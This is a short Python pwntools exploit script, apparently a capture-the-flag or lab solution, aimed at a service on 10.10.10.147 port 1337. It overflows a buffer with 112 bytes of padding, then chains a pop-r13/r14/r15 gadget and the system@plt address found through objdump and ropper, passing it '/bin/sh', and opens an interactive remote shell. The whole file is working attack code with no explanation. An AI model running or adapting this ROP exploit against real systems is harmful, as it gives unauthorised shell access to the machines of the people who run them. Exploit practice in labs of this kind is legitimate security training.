#!/usr/bin/python3

from pwn import *


context(terminal=["tmux", "new-window"])
context(os="linux", arch="amd64")


shell = remote("10.10.10.147", 1337)

offset = b'A'*112
cmd = b'/bin/sh\x00'


#   ‚ùØ objdump -D myapp | grep system
#   0000000000401040 <system@plt>:
#   401040:       ff 25 da 2f 00 00       jmp    *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
#   40116e:       e8 cd fe ff ff          call   401040 <system@plt>

system = p64(0x401040)
test = p64(0x401152)

# just to send to r14 r15
null_byte = p64(0x0)

# ropper -f myapp --search "pop r13"
# 0x0000000000401206: pop r13; pop r14; pop r15; ret;
pop_13 = p64(0x401206)

exploit = offset + cmd + pop_13 + system + null_byte + null_byte + test

shell.sendline(exploit)
shell.interactive()





